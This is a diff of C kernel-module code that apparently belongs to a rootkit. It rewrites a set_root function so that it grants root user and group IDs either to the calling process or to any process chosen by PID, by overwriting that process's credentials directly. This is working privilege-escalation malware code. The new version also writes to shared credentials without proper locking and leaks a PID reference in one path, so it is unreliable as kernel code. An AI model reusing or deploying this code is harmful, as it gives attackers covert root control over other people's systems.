@@ -4,8 +4,14 @@
 #include <linux/types.h>
 #include <linux/fs.h>
 #include <linux/cred.h>
+#include <linux/sched.h>
 #include <linux/slab.h>
-
+#include <linux/uidgid.h>
+#include <linux/binfmts.h>
+#include <linux/pid.h>
+#include <linux/pid_namespace.h>
+#include <linux/user_namespace.h>
+#include <linux/rcupdate.h>
 /* Cleanup fops struct*/
 static void cleanup_fops(struct file_operations *fops) {
     kfree(fops);
@@ -42,15 +48,35 @@ void __set_root_creds(struct cred *cred) {
     cred->fsuid.val = cred->fsgid.val = 0;
 }
 
-/* Wrapper for __set_root_creds */
-void set_root(void)
-{
-    struct cred *root;
-    root = prepare_creds();
 
-    if (root != NULL) {
-        // Set credentials to root
-        __set_root_creds(root);
-        commit_creds(root);
+/* Wrapper for __set_root_creds */
+void set_root(pid_t pid)
+{
+    struct pid *pid_struct;
+    struct task_struct *task;
+    struct cred *task_cred;
+
+    if (pid) {
+        // Set credentials of process from PID
+        pid_struct = find_get_pid(pid);
+        task = pid_task(pid_struct, PIDTYPE_PID);
+        if (task) {
+            task_lock(task);
+            
+            task_cred = rcu_dereference((task)->cred);
+            __set_root_creds(task_cred);
+
+            task_unlock(task);
+            put_pid(pid_struct);
+        }
+        
+    } else {
+      task_cred = prepare_creds();
+      if (!task_cred) {
+        return;
+      }
+      __set_root_creds(task_cred);
+      // Set credentials of current process
+      commit_creds(task_cred);
     }
 }
